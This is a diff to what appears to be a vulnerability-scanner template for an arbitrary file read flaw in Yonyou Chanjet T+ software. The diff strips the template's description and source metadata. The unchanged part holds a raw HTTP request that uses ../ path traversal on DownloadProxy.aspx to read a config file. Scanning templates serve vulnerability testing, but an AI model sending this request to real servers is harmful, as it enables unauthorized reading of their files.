@@ -3,12 +3,8 @@ info:
   name: 用友 OA 畅捷通任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ufh30zdvmwmivkzy'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ufh30zdvmwmivkzy
-    fofa: 暂无
 http:
 - raw:
   - 'GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../xinxinxinxinxinxinxin.Config HTTP/1.1
